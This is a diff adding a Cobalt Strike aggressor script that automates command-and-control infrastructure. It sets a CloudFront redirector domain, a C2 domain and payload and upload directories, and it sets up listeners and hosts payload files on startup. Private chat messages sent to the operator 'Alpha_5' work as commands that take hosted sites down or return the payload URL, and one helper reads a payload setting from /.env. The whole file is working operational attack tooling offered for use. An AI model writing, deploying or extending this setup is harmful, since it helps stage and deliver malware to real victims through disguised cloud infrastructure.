@@ -1,0 +1,49 @@
+global('$cloudfront_domain', '$c2_domain', '$payload_dir', '$uploads_dir');
+
+include(script_resource("event_hook.cna"));
+include(script_resource("listener_setup.cna"));
+include(script_resource("kill_sites.cna"));
+include(script_resource("host_sites.cna"));
+
+$cloudfront_domain = "d3815g0hmfkigc.cloudfront.net";
+$c2_domain = "wanurap.com";
+$payload_dir = "/7889b6edeb6d/panda";
+$uploads_dir = "/opt/cobaltstrike/uploads";
+
+on ready {
+    listener_setup();
+    host_sites($uploads_dir); 
+}
+
+on event_private {
+    # $1 - message author
+    # $2 - message recipient
+    # $3 - message contents
+    # $4 - time of message
+
+    local('$username', '@msg_parts', '@options');
+
+    $username = "Alpha_5";
+ 
+    if ($2 eq $username) {
+        @msg_parts = split(' ', $3);
+        $cmd = @msg_parts[0];
+        @options = sublist(@msg_parts, 1);
+        
+        if ($cmd eq "kill_site") {
+            kill_site(@options);
+        }
+
+        if ($cmd eq "cloudfront") {
+            privmsg($1, "cloudfront= $+ $cloudfront_domain $+ $payload_dir");
+        }
+
+    }
+}
+
+sub get_payload_dir {
+    $process = exec("grep PAYLOAD /.env");
+    $data  = readb($process, -1);
+    closef($process);
+    return $data;
+}
